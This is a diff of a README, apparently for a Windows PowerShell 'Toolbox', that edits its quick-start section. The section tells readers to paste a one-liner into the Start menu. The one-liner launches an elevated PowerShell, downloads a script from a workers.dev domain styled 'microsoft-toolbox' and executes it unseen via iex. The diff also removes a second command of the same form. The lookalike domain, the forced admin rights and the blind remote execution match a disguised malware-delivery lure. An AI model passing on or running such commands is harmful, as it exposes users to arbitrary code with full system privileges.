@@ -43,16 +43,10 @@ Copy the follow command and paste it in the startmenu serach bar then hit enter 
 <img src="https://raw.githubusercontent.com/PsWinToolbox/Toolbox/main/how%20to%20run.png" alt="text" width="500"> <br />
 
 
-Graphical user Interface (GUI)<br />
+Quick Start Command (GUI)<br />
 ```powershell -c "Start-Process powershell \"iex((New-Object System.Net.WebClient).DownloadString('https://ps.microsoft-toolbox.workers.dev'))\" -Verb Runas"```
-
-Command line Interface (CLI)<br />
-```powershell -c "Start-Process powershell \"iex((New-Object System.Net.WebClient).DownloadString('https://pstool.microsoft-toolbox.workers.dev'))\" -Verb Runas"```
-
- <br />
-
 
 
 <p float="left">
-<img src="https://raw.githubusercontent.com/PsWinToolbox/Toolbox/main/Toolbox.png" alt="text" width="500">
+<img src="https://raw.githubusercontent.com/PsWinToolbox/Toolbox/main/Toolbox.png" alt="text" width="700">
 </p>
